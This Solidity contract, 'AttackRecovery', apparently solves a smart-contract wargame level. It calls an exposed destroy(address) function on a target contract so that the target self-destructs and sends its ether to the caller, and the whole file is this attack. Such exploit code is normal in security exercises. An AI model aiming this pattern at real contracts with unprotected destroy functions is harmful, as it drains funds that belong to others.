// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackRecovery {
    constructor(address _recovery) public {
        recovery = _recovery;
    }

    address recovery;

    function destroyRecovery() external {
        (bool success,) = address(recovery).call(abi.encodeWithSignature("destroy(address)", msg.sender));
        require(success, "Call failed");
    }
}